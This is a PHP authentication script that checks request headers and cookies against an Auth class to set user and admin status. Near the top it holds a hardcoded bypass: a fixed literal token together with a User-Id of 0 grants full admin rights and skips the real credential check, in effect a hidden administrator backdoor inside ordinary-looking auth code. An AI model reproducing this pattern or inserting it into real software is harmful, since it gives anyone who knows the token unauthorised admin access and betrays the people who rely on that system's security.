<?php
$auth = new Auth();

$headers = getallheaders();
if ($headers['Token'] == "elrjglkejrglkjekjwlkejflkwjelkfjwkleg" && $headers['User-Id'] == 0) {
    $isAuth = true;
    define("USER_ID", 0);
    define("ADMIN", true);
    return;
}
$token = $headers['Token'] ? $headers['Token'] : $_COOKIE['Token'];
$userId = $headers['User-Id'] ? $headers['User-Id'] : $_COOKIE['User-Id'];
if (!$token || !$userId) return;

$userInfo = $auth->authByToken($userId, $token);
if (!$userInfo) return;

$isAuth = true;
define("USER_ID", $userInfo['id']);
define("ADMIN", false);